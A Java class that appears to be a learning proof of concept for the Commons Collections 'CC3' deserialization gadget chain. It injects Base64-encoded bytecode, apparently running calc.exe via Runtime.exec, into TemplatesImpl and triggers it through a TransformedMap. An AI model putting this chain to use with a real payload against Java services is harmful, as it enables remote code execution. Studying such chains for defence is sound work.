package org.example.cc;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import org.apache.commons.collections.Transformer;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;
public class TestCC3 {
    public static void setFieldValue(Object obj, String fieldName, Object
            value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {
        // source: bytecodes/HelloTemplateImpl.java
        byte[] code =
                Base64.getDecoder().decode("yv66vgAAADQAMQoADAAWCQAXABgIABkKABoAGwoAHAAdCAAeCgAcAB8HACAHACEKAAkAIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAg8Y2xpbml0PgEADVN0YWNrTWFwVGFibGUHACABAApTb3VyY2VGaWxlAQAQQ2FsY0V4YW1wbGUuamF2YQwADQAOBwAlDAAmACcBAAxDYWxjIEV4YW1wbGUHACgMACkAKgcAKwwALAAtAQAIY2FsYy5leGUMAC4ALwEAE2phdmEvaW8vSU9FeGNlcHRpb24BABpqYXZhL2xhbmcvUnVudGltZUV4Y2VwdGlvbgwADQAwAQALQ2FsY0V4YW1wbGUBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgAhAAsADAAAAAAAAgABAA0ADgABAA8AAAAtAAIAAQAAAA0qtwABsgACEgO2AASxAAAAAQAQAAAADgADAAAACwAEAAwADAANAAgAEQAOAAEADwAAAFQAAwABAAAAF7gABRIGtgAHS6cADUu7AAlZKrcACr+xAAEAAAAJAAwACAACABAAAAAWAAUAAAAGAAkACQAMAAcADQAIABYACgASAAAABwACTAcAEwkAAQAUAAAAAgAV");
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {code});
        setFieldValue(obj, "_name", "CalcExample");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[] { Templates.class },
                        new Object[] { obj })
        };
        Transformer transformerChain = new
                ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null,
                transformerChain);
        outerMap.put("test", "xxxx");
    }
}
